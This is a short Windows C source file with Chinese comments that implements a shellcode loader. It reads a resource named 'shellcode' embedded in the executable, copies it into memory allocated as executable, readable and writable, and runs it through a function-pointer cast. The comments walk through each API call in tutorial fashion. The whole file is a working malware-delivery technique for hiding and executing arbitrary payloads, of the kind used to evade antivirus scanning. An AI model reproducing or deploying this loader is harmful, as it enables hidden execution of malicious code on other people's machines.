#include <Windows.h>
#include "resource.h"

//通过资源加载ShellCode
void ResourceLoader() {

    /*
    FindResource用于查找指定模块（EXE或DLL文件）中指定名称和类型的资源,其语法格式如下:
    HRSRC FindResource(
          HMODULE hModule,  //指向包含要查找的资源的模块的句柄,若该参数为NULL，则查找当前进程中的资源
          LPCTSTR lpName,   //指向资源名称的指针，可以是一个字符串或者一个整数，若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源标识符
          LPCTSTR lpType    //指向资源类型的指针，可以是一个字符串或者一个整数。若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源类型标识符
    );
    如果查找成功，则返回资源句柄；否则返回NULL
    */
    HRSRC Res = FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE1), L"shellcode");

    //用于获取资源的大小
    DWORD ResSize = SizeofResource(NULL, Res);

    //LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄
    HGLOBAL Load = LoadResource(NULL, Res);

    //申请内存
    void* buffer = VirtualAlloc(NULL, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(buffer, Load, ResSize);

    //执行shellcode
    ((void(*)(void)) buffer)();
}

int main() {

    ResourceLoader();
}